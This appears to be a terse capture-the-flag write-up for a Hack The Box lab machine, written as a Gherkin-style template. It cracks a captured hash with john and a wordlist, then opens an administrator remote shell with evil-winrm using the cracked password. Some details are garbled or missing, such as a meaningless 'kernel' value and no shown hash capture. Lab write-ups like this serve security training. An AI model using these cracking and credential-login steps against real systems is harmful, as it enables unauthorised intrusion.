## Version 2.0
## language: en

 Code: #O
    {code} #Code of the challenge if it exists
  Site: #M
    {https://app.hackthebox.com/starting-point?tier=1} 
  Category: #O
    {easy - medium} 
  User: #M
    {ultramagnu} 
  Goal: #M
    {ea81b7afddd03efaa0945333ed147fac} 

  Background:

    Hacker's software:
    | <Software name>        |       <Version>     |
    | Kali GNU/Linux Rolling |        2022.3       |
    | Firefox ESR            | 91.11 Oesr (64 bit) |



  Machine information:
    Given I am accessing the {responder} through a VPN
    And echo with {echo "10.129.85.9 unika.htb" >> /etc/hosts}
    And enter a firefox that allows me to {http://unika.htb/}
    And js  version {http://unika.htb/js/}
    And is running on windows with kernel {GI0Y36V05KK}

 Scenario: {Fail|Success}:{method-used-2}
    Given I print {john -w=/usr/share/wordlists/rockyou.txt hash.txt}
    Then I try to decrypt {password : badminton} by doing {evil-winrm -i10.129.85.9 -u administrator -p badminton }
    And get {flag.txt}
    Then I can actually read the flag from {ea81b7afddd03efaa0945333ed147fac}
    And I conclude that {E} worked
    And solved the challenge
